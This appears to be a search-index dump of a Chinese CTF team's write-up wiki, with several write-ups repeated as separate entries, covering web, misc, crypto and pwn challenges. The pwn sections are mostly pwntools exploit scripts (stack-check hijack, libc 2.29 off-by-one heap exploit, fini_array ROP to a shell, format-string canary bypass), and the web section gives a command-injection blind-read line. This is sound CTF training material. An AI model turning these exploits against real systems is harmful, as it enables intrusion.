docs.text: 自留地 ¶ 这儿主要写一些比赛的wp 暂时由以下人员维护： Nopnoping(大佬) ：一个非常非常非常厉害的pwn，左能焊芯片，右能写代码。（大佬无疑 blog地址 sw0r3d(划水) ：一个辣鸡web&crypto，每次职业抱nop佬大腿。（noptql blog地址 下面简单写一下关于git怎么添加用户： 本地生成对应账户的ssh密钥 用 ssh-add (对应的密钥) 来添加ssh密钥 如果上面报错就用 ssh-agent bash 来更新一下 ssh -T git@github.com 测试一下用户 然后git clone到本地就可以进行修改，建议先本地测试再远程提交： # 在wiki目录里执行 mkdocs serve 然后在127.0.0.1:8000就能看到本地生成的wiki了 远程提交： mkdocs gh-deploy
docs.title: 介绍

docs.text: 这儿主要写一些比赛的wp 暂时由以下人员维护： Nopnoping(大佬) ：一个非常非常非常厉害的pwn，左能焊芯片，右能写代码。（大佬无疑 blog地址 sw0r3d(划水) ：一个辣鸡web&crypto，每次职业抱nop佬大腿。（noptql blog地址 下面简单写一下关于git怎么添加用户： 本地生成对应账户的ssh密钥 用 ssh-add (对应的密钥) 来添加ssh密钥 如果上面报错就用 ssh-agent bash 来更新一下 ssh -T git@github.com 测试一下用户 然后git clone到本地就可以进行修改，建议先本地测试再远程提交： # 在wiki目录里执行 mkdocs serve 然后在127.0.0.1:8000就能看到本地生成的wiki了 远程提交： mkdocs gh-deploy
docs.title: 自留地

docs.text: Web ¶ 帮帮小红花 ¶ 考点： 预期：防火墙绕过 非预期：盲注 因为是一开始做的，权限没对有人写了shell.php，被我扫出来了，直接上车，后面用看到flag知道了跟iptables命令有关，也就是防火墙。这儿没环境了，等有环境补上。 后面还有盲注解法，也就是通过grep来查找字符和sleep来进行盲注，大概思路： cat /flag |grep 'BJD{xx' || sleep(2); Misc ¶ baby_web ¶ 考点：零宽度字符隐写、各种奇怪密码 参考： http://www.ga1axy.top/index.php/archives/20/ 有个压缩包，压缩包密码在html里面，关于零宽度字符的参考在ga1axy师傅blog（上面），解密后需要逆一下图片的hex，脚本： f = open ( 'f14g.png' , 'rb' ) . read () f2 = list ( f ) f3 = f2 [:: - 1 ] #print f3 f4 = '' . join ( f3 ) with open ( 'f1ag.png' , 'wb' ) as f : f . write ( f4 ) 然后在对应网站上解密即可。 bin/cat 2 ¶ 考点：二维码转换 我是直接把图片用ste处理然后调到对比度比较高的通道扫即可（逃 questionnaire ¶ 考点：查源码 签到题不说了，答案在源码，连接下面的十六进制字符即可 Crypto ¶ bbcrypto ¶ 考点：简单加密 通过已知密文和部分明文枚举出a和salt，然后通过密文枚举flag值（脚本写的太辣鸡了，轻喷 from __future__ import print_function import string from itertools import * enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' dict1 = string . ascii_lowercase #print dict1 #salt = 'abc' #si = cycle(salt.lower()) def encrypt ( m , a , si ): c = "" for i in range ( len ( m )): c += hex ((( ord ( m [ i ])) * a + ord ( next ( si ))) % 128 )[ 2 :] . zfill ( 2 ) return c # for i in dict1: # for j in dict1: # for k in dict1: # salt = i+j+k # si = cycle(salt.lower()) # for m in range(128): # if encrypt('flag{',m,si) == '177401504b': # print m salt = 'ahh' a = 57 si = cycle ( salt . lower ()) enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' flag = '' dict2 = '0123456789' + string . ascii_lowercase + ' {} ' # for m in range(len(enc)/2): # for i in dict2: # for salt in ['ahh','hah','hha']: # if encrypt(i,a,si) == enc[m*2:m*2+2]: # print(i,end='') # break flag = list ( 'ad7vd9z7v3rffdd2q8w5vb4s7x6ua1ra7v2s7vb3ta8wfbc4u' ) for i in flag : if ord ( i ) > ord ( 'f' ): flag . remove ( i ) print ( '' . join ( flag )) easyLCG ¶ 考点：LCG简单利用 比较简单的LCG，通过output枚举出s1，然后通过s1求出s2，进而s3也能被预测： from Crypto.Util.number import * a = 3844066521 b = 3316005024 m = 2249804527 for i in range ( 65536 ): s1 = int ( bin ( 16269 )[ 2 :] + bin ( i )[ 2 :] . zfill ( 16 ), 2 ) s2 = ( s1 * a + b ) % m if s2 >> 16 == 4249 : print s1 然后改一下加密脚本就能求出key： from Crypto.Util.number import * class lcg : def __init__ ( self ): self . a = 3844066521 self . b = 3316005024 self . m = 2249804527 self . seed = 278490266 def next ( self ): self . seed = ( self . a * self . seed + self . b ) % self . m return self . seed >> 16 class DH : def __init__ ( self ): self . lcg = lcg () self . g = 183096451267674849541594370111199688704 self . m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self . A , self . a = self . gen_AB () self . B , self . b = self . gen_AB () self . key = pow ( self . A , self . b , self . m ) def gen_AB ( self ): x = '' for _ in range ( 64 ): x += '1' if self . lcg . next () % 2 else '0' return pow ( self . g , int ( x , 2 ), self . m ), int ( x , 2 ) #DH = DH() print long_to_bytes ( DH () . key ^ 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703 ) pwn ¶ TaQiniOJ-0 - 100 ¶ 程序模拟了c语言编译器，但是对输入c代码进行了敏感字符过滤可以利用字符拼接，异或操作等使敏感字符在程序运行中得到而不是在将其输入到c代码中。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10002 ) else : sh = process () if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' code = ''' #include <stdio.h> #include <stdlib.h> char name[20]="/hom"; char a[]="e/ct"; char b[]="f/fl"; char c[2]="ag"; char ff[0x300]; int main() { for(int i=0;i<4;i++) name[4+i]=a[i]; for(int i=0;i<4;i++) name[8+i]=b[i]; name[12]=c[0]; name[13]=c[1]; printf(" %s ",name); FILE * fd=fopen(name,"r"); if(fd==-1) { printf("error"); return 0; } fread(ff,1,0x100,fd); printf(" %s ",ff); return 0; }@ ''' sh . sendline ( test ) sh . interactive () 这个题目还有一个非预期解 #include '/home/ctf/fl\ ag' 这个方法也可用来做TaQiniOJ-1 Memory Moster Ⅰ ¶ 栈溢出，但是有Canary保护，所以可以劫持__stack_chk_fail函数来getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) stack_fail = 0x0000000000404028 target = 0x000000000040124A sh . recvuntil ( 'addr:' ) payload = p64 ( stack_fail ) . ljust ( 0x30 , ' \x00 ' ) sh . sendline ( payload ) sh . recvuntil ( 'data:' ) sh . send ( p64 ( target )) sh . interactive () happyending ¶ libc2.29下的off_by_one，需要绕过presize和unlink检测，但是没有办法泄漏heap的地址，所以需要灵活的利用largbin，smallbin fastbin残留的数据来bypass前面的检测，进而利用off_by_one完成对合并实现chunk overlapping。之后就可以利用tcache_dup来达到任意地址分配的目的，修改__malloc_hook来getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10106 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( size , content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( str ( size )) sh . recvuntil ( '!' ) sh . send ( content ) def show ( index ): choice ( 3 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) def delete ( index ): choice ( 2 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) libc = ELF ( './libc.so.6' ) #padding for i in range ( 3 ): add ( 0x1000 , 'padding' ) #+0-2 add ( 0xc20 , 'padding' ) #+3 #get fake chunk for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0xb00 , 'a' ) #11 add ( 0x10 , 'a' ) #12 delete ( 11 ) #-11 add ( 0x28 , p64 ( 0 ) + p64 ( 0x201 ) + p8 ( 0x40 )) #11 #make fake chunk fd->bk=fake chunk add ( 0xb00 , 'a' ) #13 ==>make 12 to largebin add ( 0x28 , p64 ( 0 ) + p64 ( 0 ) + p64 ( 0 ) + p8 ( 0x10 )) #14 #make fake chunk bk->fd=fake chunk add ( 0x28 , 'a' ) #15 add ( 0x28 , 'a' ) #16 for i in range ( 7 ): delete ( 4 + i ) #-4-10 delete ( 15 ) #-15 delete ( 11 ) #-11 for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0x28 , ' \x10 ' ) #+11 ==>modify fake chunk add ( 0x28 , 'a' ) #+15 add ( 0x80 , 'a' ) #17 add ( 0x80 , 'a' ) #18 add ( 0x28 , 'a' ) #19 add ( 0x8f0 , 'a' ) #20 # null of by one delete ( 19 ) #-19 add ( 0x28 , p64 ( 0 ) * 4 + p64 ( 0x200 )) delete ( 20 ) #-20 #leak libc add ( 0xa0 , 'a' ) #+19 add ( 0x80 , 'a' ) #+21 add ( 0x9b0 , 'a' ) #+22 for i in range ( 7 ): add ( 0x80 , 'a' ) #23-29 for i in range ( 7 ): delete ( 23 + i ) #-23-29 delete ( 21 ) show ( 17 ) sh . recvuntil ( ' \n ' ) libc_base = u64 ( sh . recvuntil ( '1' ) . replace ( '1' , ' \x00 ' ) . ljust ( 8 , ' \x00 ' )) - 0x1e4ca0 malloc_hook = libc_base + libc . symbols [ '__malloc_hook' ] realloc = libc_base + libc . symbols [ 'realloc' ] onegadget = libc_base + 0x106ef8 print hex ( onegadget ) #tcache dup for i in range ( 7 ): add ( 0x80 , 'a' ) delete ( 22 ) add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 )) delete ( 18 ) delete ( 22 ) #get shell add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 ) + p64 ( malloc_hook - 8 )) add ( 0x80 , 'a' ) add ( 0x80 , p64 ( onegadget ) + p64 ( realloc + 6 )) choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( '200' ) sh . interactive () Secret2 ¶ 每循环一次都会打开一次设备，而linux默认情况下最多只能打开1024个设备，所以当打开超过1024以后，将会打开失败，而读取打开失败的文件设备读入数据将会是零。 程序还存在一个栈溢出漏洞，但是关闭了输入设备，所以我们的payload要一次性就可以获得flag，我们主要到程序中有一个字符串cat/flag，如果我们可以将这个字符串拷贝到bss段，并将/替换为空格，那我们就可以利用system来获得flag。刚好我们有memcpt，memset函数可以使用，接下来需要解决的问题就是去控制rdi，rsi，rdx三个寄存器的值，程序没有pop rdx；ret这样的gadget，所以我们只能利用libc_scu_init来执行函数，这里要注意灵活组合payload，不要浪费任何一个字节，因为用libc_sct_init来执行函数的话，需要的溢出空间比较大，而我们只能溢出0x100-9的地址，所以要好好的组合。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10051 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './secret2' ) #make payload bss = 0x00000000004040A8 pop6_ret = 0x401612 begin = 0x4015f8 memcpy = 0x0000000000404060 memset = 0x0000000000404040 rdi_ret = 0x000000000040161b system = 0x0000000000401060 def make_payload ( rdi , rsi , rdx , func ): p = p64 ( 0 ) + p64 ( 1 ) + p64 ( func ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) p += p64 ( begin ) return p payload = ' \x00 ' * 9 #1 payload += p64 ( pop6_ret ) + make_payload ( bss , 0x0000000004021DB , 8 , memcpy ) #2 payload += p64 ( 0 ) + make_payload ( bss + 3 , 0x20 , 1 , memset ) payload += p64 ( 0 ) * 7 + p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) print len ( payload ) sh . recvuntil ( 'name?' ) sh . send ( payload ) #bypass secret while True : sh . recvuntil ( 'Secret' ) sh . send ( ' \x00 ' * 8 ) sh . recvuntil ( 'JOB' ) times = int ( sh . recvuntil ( 'TIMES' ) . replace ( 'TIMES' , '' ) . replace ( ' ' , '' )) print times if times == 0 : break sh . recvuntil ( 'Secret' ) sh . sendline ( 'a' ) sh . recvuntil ( 'Secret' ) sh . send ( ' \x00 ' * 8 ) sh . interactive () Memory Moster Ⅱ ¶ 利用程序从main函数结束后会调用fini_array里面的函数，来栈迁移进而写ROP，获取shell。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B80B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CB0 rdx_ret = 0x0000000000448415 rsi_ret = 0x0000000000406f80 rdi_ret = 0x0000000000401746 rax_ret = 0x0000000000448fcc bss = 0x0000000004C0790 + 0x10 system = 0x0000000000410A50 read = 0x000000000448400 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44840c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \x00 ' ) sh . interactive () Memory MosterⅢ ¶ 原理和上一题相同，exp也是类似，只是gadget有一点区别。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B50B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CA0 rdx_ret = 0x0000000000447635 rsi_ret = 0x0000000000406f70 rdi_ret = 0x0000000000401746 rax_ret = 0x000000000044806c bss = 0x00000000004BD790 + 0x10 read = 0x0000000000447620 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44762c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \x00 ' ) sh . interactive () easybabystack ¶ 这道题利用了格式化字符串*的特性。 *可以用参数来计算占位符的宽度。如:%*2$c，就是用第二个参数的值来决定这个格式化字符的宽度。利用这一特性我们就可以输出和canary一样大小的字符进而用%n修改变量来bypass。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10001 ) else : sh = process ( './easybabystack' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x00000000004016C7 # c # ''') start = 0x0000000000401710 pop6_ret = 0x00000000040172A read_plt = 0x0000000000404038 bss = 0x00000000004040C8 + 0x10 system = 0x000000000401040 rdi_ret = 0x0000000000401733 def make_payload ( rdi , rsi , rdx , addr ): p = p64 ( pop6_ret ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) + p64 ( addr ) p += p64 ( start ) + p64 ( 0 ) * 7 return p sh . recvuntil ( 'name:' ) sh . sendline ( '%*18$c%5$n' ) sh . recvuntil ( 'passwd:' ) a = 0xfe sh . sendline ( str ( a )) sh . recvuntil ( 'message:' ) payload = 'a' * 0x118 payload += make_payload ( 0 , bss , 0x10 , read_plt ) payload += p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) sh . sendline ( payload ) sh . interactive ()

docs.title: questionnaire

docs.text: 考点：简单加密 通过已知密文和部分明文枚举出a和salt，然后通过密文枚举flag值（脚本写的太辣鸡了，轻喷 from __future__ import print_function import string from itertools import * enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' dict1 = string . ascii_lowercase #print dict1 #salt = 'abc' #si = cycle(salt.lower()) def encrypt ( m , a , si ): c = "" for i in range ( len ( m )): c += hex ((( ord ( m [ i ])) * a + ord ( next ( si ))) % 128 )[ 2 :] . zfill ( 2 ) return c # for i in dict1: # for j in dict1: # for k in dict1: # salt = i+j+k # si = cycle(salt.lower()) # for m in range(128): # if encrypt('flag{',m,si) == '177401504b': # print m salt = 'ahh' a = 57 si = cycle ( salt . lower ()) enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' flag = '' dict2 = '0123456789' + string . ascii_lowercase + ' {} ' # for m in range(len(enc)/2): # for i in dict2: # for salt in ['ahh','hah','hha']: # if encrypt(i,a,si) == enc[m*2:m*2+2]: # print(i,end='') # break flag = list ( 'ad7vd9z7v3rffdd2q8w5vb4s7x6ua1ra7v2s7vb3ta8wfbc4u' ) for i in flag : if ord ( i ) > ord ( 'f' ): flag . remove ( i ) print ( '' . join ( flag ))
docs.title: bbcrypto

docs.text: 考点：LCG简单利用 比较简单的LCG，通过output枚举出s1，然后通过s1求出s2，进而s3也能被预测： from Crypto.Util.number import * a = 3844066521 b = 3316005024 m = 2249804527 for i in range ( 65536 ): s1 = int ( bin ( 16269 )[ 2 :] + bin ( i )[ 2 :] . zfill ( 16 ), 2 ) s2 = ( s1 * a + b ) % m if s2 >> 16 == 4249 : print s1 然后改一下加密脚本就能求出key： from Crypto.Util.number import * class lcg : def __init__ ( self ): self . a = 3844066521 self . b = 3316005024 self . m = 2249804527 self . seed = 278490266 def next ( self ): self . seed = ( self . a * self . seed + self . b ) % self . m return self . seed >> 16 class DH : def __init__ ( self ): self . lcg = lcg () self . g = 183096451267674849541594370111199688704 self . m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self . A , self . a = self . gen_AB () self . B , self . b = self . gen_AB () self . key = pow ( self . A , self . b , self . m ) def gen_AB ( self ): x = '' for _ in range ( 64 ): x += '1' if self . lcg . next () % 2 else '0' return pow ( self . g , int ( x , 2 ), self . m ), int ( x , 2 ) #DH = DH() print long_to_bytes ( DH () . key ^ 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703 )
docs.title: easyLCG

docs.text: 程序模拟了c语言编译器，但是对输入c代码进行了敏感字符过滤可以利用字符拼接，异或操作等使敏感字符在程序运行中得到而不是在将其输入到c代码中。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10002 ) else : sh = process () if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' code = ''' #include <stdio.h> #include <stdlib.h> char name[20]="/hom"; char a[]="e/ct"; char b[]="f/fl"; char c[2]="ag"; char ff[0x300]; int main() { for(int i=0;i<4;i++) name[4+i]=a[i]; for(int i=0;i<4;i++) name[8+i]=b[i]; name[12]=c[0]; name[13]=c[1]; printf(" %s ",name); FILE * fd=fopen(name,"r"); if(fd==-1) { printf("error"); return 0; } fread(ff,1,0x100,fd); printf(" %s ",ff); return 0; }@ ''' sh . sendline ( test ) sh . interactive () 这个题目还有一个非预期解 #include '/home/ctf/fl\ ag' 这个方法也可用来做TaQiniOJ-1
docs.title: TaQiniOJ-0 - 100

docs.text: 栈溢出，但是有Canary保护，所以可以劫持__stack_chk_fail函数来getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) stack_fail = 0x0000000000404028 target = 0x000000000040124A sh . recvuntil ( 'addr:' ) payload = p64 ( stack_fail ) . ljust ( 0x30 , ' \x00 ' ) sh . sendline ( payload ) sh . recvuntil ( 'data:' ) sh . send ( p64 ( target )) sh . interactive ()
docs.title: Memory Moster Ⅰ

docs.text: libc2.29下的off_by_one，需要绕过presize和unlink检测，但是没有办法泄漏heap的地址，所以需要灵活的利用largbin，smallbin fastbin残留的数据来bypass前面的检测，进而利用off_by_one完成对合并实现chunk overlapping。之后就可以利用tcache_dup来达到任意地址分配的目的，修改__malloc_hook来getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10106 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( size , content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( str ( size )) sh . recvuntil ( '!' ) sh . send ( content ) def show ( index ): choice ( 3 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) def delete ( index ): choice ( 2 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) libc = ELF ( './libc.so.6' ) #padding for i in range ( 3 ): add ( 0x1000 , 'padding' ) #+0-2 add ( 0xc20 , 'padding' ) #+3 #get fake chunk for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0xb00 , 'a' ) #11 add ( 0x10 , 'a' ) #12 delete ( 11 ) #-11 add ( 0x28 , p64 ( 0 ) + p64 ( 0x201 ) + p8 ( 0x40 )) #11 #make fake chunk fd->bk=fake chunk add ( 0xb00 , 'a' ) #13 ==>make 12 to largebin add ( 0x28 , p64 ( 0 ) + p64 ( 0 ) + p64 ( 0 ) + p8 ( 0x10 )) #14 #make fake chunk bk->fd=fake chunk add ( 0x28 , 'a' ) #15 add ( 0x28 , 'a' ) #16 for i in range ( 7 ): delete ( 4 + i ) #-4-10 delete ( 15 ) #-15 delete ( 11 ) #-11 for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0x28 , ' \x10 ' ) #+11 ==>modify fake chunk add ( 0x28 , 'a' ) #+15 add ( 0x80 , 'a' ) #17 add ( 0x80 , 'a' ) #18 add ( 0x28 , 'a' ) #19 add ( 0x8f0 , 'a' ) #20 # null of by one delete ( 19 ) #-19 add ( 0x28 , p64 ( 0 ) * 4 + p64 ( 0x200 )) delete ( 20 ) #-20 #leak libc add ( 0xa0 , 'a' ) #+19 add ( 0x80 , 'a' ) #+21 add ( 0x9b0 , 'a' ) #+22 for i in range ( 7 ): add ( 0x80 , 'a' ) #23-29 for i in range ( 7 ): delete ( 23 + i ) #-23-29 delete ( 21 ) show ( 17 ) sh . recvuntil ( ' \n ' ) libc_base = u64 ( sh . recvuntil ( '1' ) . replace ( '1' , ' \x00 ' ) . ljust ( 8 , ' \x00 ' )) - 0x1e4ca0 malloc_hook = libc_base + libc . symbols [ '__malloc_hook' ] realloc = libc_base + libc . symbols [ 'realloc' ] onegadget = libc_base + 0x106ef8 print hex ( onegadget ) #tcache dup for i in range ( 7 ): add ( 0x80 , 'a' ) delete ( 22 ) add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 )) delete ( 18 ) delete ( 22 ) #get shell add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 ) + p64 ( malloc_hook - 8 )) add ( 0x80 , 'a' ) add ( 0x80 , p64 ( onegadget ) + p64 ( realloc + 6 )) choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( '200' ) sh . interactive ()
docs.title: happyending

docs.text: 每循环一次都会打开一次设备，而linux默认情况下最多只能打开1024个设备，所以当打开超过1024以后，将会打开失败，而读取打开失败的文件设备读入数据将会是零。 程序还存在一个栈溢出漏洞，但是关闭了输入设备，所以我们的payload要一次性就可以获得flag，我们主要到程序中有一个字符串cat/flag，如果我们可以将这个字符串拷贝到bss段，并将/替换为空格，那我们就可以利用system来获得flag。刚好我们有memcpt，memset函数可以使用，接下来需要解决的问题就是去控制rdi，rsi，rdx三个寄存器的值，程序没有pop rdx；ret这样的gadget，所以我们只能利用libc_scu_init来执行函数，这里要注意灵活组合payload，不要浪费任何一个字节，因为用libc_sct_init来执行函数的话，需要的溢出空间比较大，而我们只能溢出0x100-9的地址，所以要好好的组合。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10051 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './secret2' ) #make payload bss = 0x00000000004040A8 pop6_ret = 0x401612 begin = 0x4015f8 memcpy = 0x0000000000404060 memset = 0x0000000000404040 rdi_ret = 0x000000000040161b system = 0x0000000000401060 def make_payload ( rdi , rsi , rdx , func ): p = p64 ( 0 ) + p64 ( 1 ) + p64 ( func ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) p += p64 ( begin ) return p payload = ' \x00 ' * 9 #1 payload += p64 ( pop6_ret ) + make_payload ( bss , 0x0000000004021DB , 8 , memcpy ) #2 payload += p64 ( 0 ) + make_payload ( bss + 3 , 0x20 , 1 , memset ) payload += p64 ( 0 ) * 7 + p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) print len ( payload ) sh . recvuntil ( 'name?' ) sh . send ( payload ) #bypass secret while True : sh . recvuntil ( 'Secret' ) sh . send ( ' \x00 ' * 8 ) sh . recvuntil ( 'JOB' ) times = int ( sh . recvuntil ( 'TIMES' ) . replace ( 'TIMES' , '' ) . replace ( ' ' , '' )) print times if times == 0 : break sh . recvuntil ( 'Secret' ) sh . sendline ( 'a' ) sh . recvuntil ( 'Secret' ) sh . send ( ' \x00 ' * 8 ) sh . interactive ()
docs.title: Secret2

docs.text: 利用程序从main函数结束后会调用fini_array里面的函数，来栈迁移进而写ROP，获取shell。 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B80B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CB0 rdx_ret = 0x0000000000448415 rsi_ret = 0x0000000000406f80 rdi_ret = 0x0000000000401746 rax_ret = 0x0000000000448fcc bss = 0x0000000004C0790 + 0x10 system = 0x0000000000410A50 read = 0x000000000448400 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44840c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \x00 ' ) sh . interactive ()
docs.title: Memory Moster Ⅱ

